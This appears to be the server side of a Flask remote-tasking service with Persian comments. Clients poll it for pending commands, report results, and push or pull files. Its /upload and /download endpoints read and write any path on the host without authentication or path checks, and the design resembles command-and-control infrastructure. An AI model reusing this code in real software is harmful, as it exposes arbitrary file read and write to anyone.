from flask import Blueprint, request, jsonify
import sqlite3
from datetime import datetime
import base64
import os
client_bp = Blueprint('client', __name__, url_prefix='/api/client')


def init_results_table():
    conn = sqlite3.connect("db.sqlite")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS Results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_id INTEGER,
            result_data TEXT,
            created_at TEXT,
            FOREIGN KEY (command_id) REFERENCES Commands (id)
        )
    """)
    conn.commit()
    conn.close()

init_results_table()


@client_bp.route('/results', methods=['POST'])
def create_result():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        command_id = data.get('command_id')
        if not command_id:
            return jsonify({"status": "error", "message": "command_id is required"}), 400

        result_text = data.get('result', '')
        status_success = data.get('status', True)

        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        # چک کن کامند وجود داره
        cursor.execute("SELECT id FROM Commands WHERE id = ?", (command_id,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({"status": "error", "message": f"Command ID {command_id} not found"}), 404

        new_status = 'completed' if status_success else 'failed'

        # وضعیت درست کامند رو آپدیت کن
        cursor.execute("UPDATE Commands SET status = ? WHERE id = ?", (new_status, command_id))

        # نتیجه رو ذخیره کن
        cursor.execute("""
            INSERT INTO Results (command_id, result_data, created_at)
            VALUES (?, ?, ?)
        """, (command_id, result_text, datetime.now().isoformat()))

        conn.commit()
        conn.close()

        return jsonify({
            "status": "success",
            "message": "Result registered successfully",
            "command_id": command_id,
            "new_status": new_status
        }), 201

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

    
@client_bp.route('/get-command', methods=['GET'])
#  http://127.0.0.1:5000/api/client/get-command
def get_last_pending_command():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("""
            SELECT id, command_text, arguments 
            FROM Commands 
            WHERE status = 'pending' 
            ORDER BY created_at DESC 
            LIMIT 1
        """)
        command = cursor.fetchone()
        conn.close()

        if command:
            return jsonify({
                "status": "success",
                "command_id": command[0],
                "command_text": command[1] or "",
                "arguments": command[2] or ""
            }), 200
        else:
            return jsonify({
                "status": "empty",
                "message": "هیچ دستور در حال انتظاری وجود ندارد."
            }), 200  

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"خطا در دریافت دستور: {str(e)}"
        }), 500
    
@client_bp.route('/upload', methods=['POST'])
def client_upload():
    data = request.get_json() or {}
    file_path = data.get('path', '').strip()
    file_data = data.get('data', '')
    filename = data.get('filename', 'uploaded_file')

    if not file_path or not file_data:
        return jsonify({"status": "error", "message": "Missing path or file data"}), 400

    try:
        full_path = os.path.abspath(os.path.join(file_path, filename))
        os.makedirs(os.path.dirname(full_path), exist_ok=True)

        with open(full_path, 'wb') as f:
            f.write(base64.b64decode(file_data))

        return jsonify({
            "status": "success",
            "message": f"File successfully uploaded to {full_path}"
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@client_bp.route('/download', methods=['POST'])
def client_download():
    data = request.get_json() or {}
    file_path = data.get('path', '').strip()

    if not file_path:
        return jsonify({"status": "error", "message": "No file path provided"}), 400

    try:
        full_path = os.path.abspath(file_path)

        if not os.path.exists(full_path):
            return jsonify({"status": "error", "message": "File not found"}), 404

        if os.path.isdir(full_path):
            return jsonify({"status": "error", "message": "Path is a directory"}), 400

        with open(full_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')

        return jsonify({
            "status": "success",
            "filename": os.path.basename(full_path),
            "data": file_data,
            "size": os.path.getsize(full_path)
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


